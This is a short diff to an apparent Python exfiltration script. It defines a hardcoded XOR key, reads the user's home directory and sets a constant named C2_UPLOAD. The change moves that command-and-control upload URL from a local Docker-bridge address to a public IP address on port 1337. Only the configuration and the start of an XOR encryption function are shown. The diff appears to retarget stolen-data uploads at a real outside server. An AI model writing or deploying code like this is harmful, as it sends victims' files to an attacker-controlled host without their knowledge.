@@ -4,7 +4,7 @@ from pathlib import Path
 
 SESSION_ID = "session1234"
 XOR_KEY     = b"mysecretpassword"
-C2_UPLOAD   = "http://172.17.0.1:1337/upload"
+C2_UPLOAD   = "http://34.218.60.251:1337/upload"
 home = os.path.expanduser("~")
 
 def xor_encrypt(data: bytes, key: bytes) -> bytes:
